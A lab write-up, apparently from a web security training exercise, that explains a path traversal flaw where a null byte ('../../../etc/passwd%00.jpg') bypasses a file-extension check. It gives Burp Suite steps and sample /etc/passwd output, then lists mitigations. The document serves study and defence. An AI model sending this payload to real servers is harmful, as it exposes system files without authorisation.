# Lab: File Path Traversal - Validation of File Extension with Null Byte Bypass

## Overview
This lab is vulnerable to a file path traversal attack. The application validates that the supplied filename ends with `.jpg`, but the validation can be bypassed using a null byte injection.

## Objective
Exploit the path traversal vulnerability and retrieve the contents of the `/etc/passwd` file.

## Tools Used
- Burp Suite (Proxy, HTTP History, Repeater)
- Browser (Firefox)

## Vulnerability Explanation
The application loads image files using requests such as:

```bash
/image?filename=70.jpg
```

The server validates that the filename ends with:

```bash
.jpg
```

However, the application is vulnerable to null byte injection.

Payload used:

```bash
../../../etc/passwd%00.jpg
```

Explanation:

- `%00` represents a null byte character.
- Some server-side languages treat the null byte as the end of the string.
- The application checks for `.jpg` before the null byte.
- The operating system interprets the filename only up to `%00`.

As a result, the actual file accessed becomes:

```bash
../../../etc/passwd
```

This bypasses the extension validation and exposes sensitive files.

## Steps to Reproduce

1. Open the lab in the browser.
2. Turn ON Burp Suite Proxy.
3. Visit any product page.
4. Go to **HTTP History** in Burp Suite.
5. Locate the image request:

```bash
GET /image?filename=70.jpg
```

6. Right-click the request → **Send to Repeater**.
7. Modify the request parameter to:

```bash
GET /image?filename=../../../etc/passwd%00.jpg
```

8. Click **Send**.
9. Observe the response from the server.

## Proof of Concept

The server responds with contents of the `/etc/passwd` file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

This confirms successful exploitation of the path traversal vulnerability.

## Payload Used

```bash
../../../etc/passwd%00.jpg
```

## Impact

- Unauthorized access to sensitive system files
- Exposure of usernames and system information
- Possible server compromise
- Increased risk of further exploitation

## Mitigation

- Reject null byte characters in user input
- Normalize and validate file paths securely
- Validate the final resolved file path
- Restrict file access to intended directories only
- Use secure APIs that properly handle string termination

## Key Learnings

- Learned how null byte injection bypasses extension validation
- Understood weaknesses in file extension filtering
- Practiced exploiting traversal vulnerabilities using Burp Repeater
- Improved understanding of insecure file handling mechanisms
